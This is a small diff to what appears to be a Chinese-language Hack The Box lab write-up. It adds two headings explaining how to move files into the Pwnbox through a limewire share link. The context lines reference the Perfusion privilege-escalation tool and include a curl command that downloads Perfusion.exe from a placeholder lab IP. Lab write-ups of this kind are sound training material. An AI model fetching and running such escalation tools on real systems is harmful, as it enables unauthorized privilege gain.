@@ -168,7 +168,9 @@ https://github.com/itm4n/Perfusion
 % curl http://IP:89/Perfusion.exe -o Perfusion.exe
 ```
 #### 从本机 -> HTB Pwnbox: https://limewire.com
+##### 点击shares，复制url
 ![果然在继续](images/081505.png)
+##### 在HTB Pwnbox 的浏览器粘贴下载
 #### 继续
 #### 从HTB Pwnbox靶机 -> 靶机使用bloodyAD打开的windowns
 ```
